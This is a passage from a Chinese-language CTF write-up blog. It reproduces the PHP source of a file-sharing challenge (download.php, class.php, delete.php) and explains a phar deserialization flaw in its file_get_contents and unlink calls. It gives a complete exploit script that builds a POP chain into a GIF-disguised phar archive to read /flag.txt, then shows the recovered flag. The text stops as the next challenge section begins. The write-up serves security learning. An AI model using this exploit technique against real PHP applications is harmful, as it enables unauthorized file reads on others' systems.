class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现存在一个class.php文件，源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以发现在download.php中存在这样的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file-&gt;close();</span><br></pre></td></tr></table></figure><p>这会触发file_get_contents，存在phar反序列化！我们只需要上传一个phar文件然后下载文件来phar伪协议即可。</p><p>接下来，我们需要构造的是pop链，构造恶意phar文件。</p><p>这里要注意File中只是return了flag.txt的内容，并没有输出，所以我们想办法将其输出！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span>=<span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=<span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//删除之前的test.phar文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//开始缓冲 Phar 写操作</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="comment">//设置stub，添加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); <span class="comment">//要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);  <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">////停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下为delete.php，删除文件时触发unlink，也会触发phar反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;c75690ab-7f71-4249-9591-3604d9b33f33&#125;</span><br></pre></td></tr></table></figure><h2 id="MoeCTF-2021-地狱通讯"><a href="#MoeCTF-2021-地狱通讯" class="headerlink" title="[MoeCTF 2021]地狱通讯"></a>[MoeCTF 2021]地狱通讯</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162221344.png" alt="image-20241217162221344"></p><p>整理得到如下源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 